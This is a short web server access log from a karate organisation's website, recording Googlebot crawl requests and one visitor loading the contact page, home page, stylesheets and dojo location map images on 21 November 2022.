::ffff:66.249.79.184 - - [21/Nov/2022:16:33:48 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.79.180 - - [21/Nov/2022:16:33:48 +0000] "GET /events.html HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:24.130.54.41 - - [21/Nov/2022:16:34:14 +0000] "GET /contact HTTP/1.1" 200 10017 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:34:14 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://www.wadokikai.org/contact" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:34:15 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://www.wadokikai.org/contact" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:34:15 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://www.wadokikai.org/contact" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:36:41 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:36:41 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:36:41 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:36:41 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:36:41 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:36:41 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:36:41 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
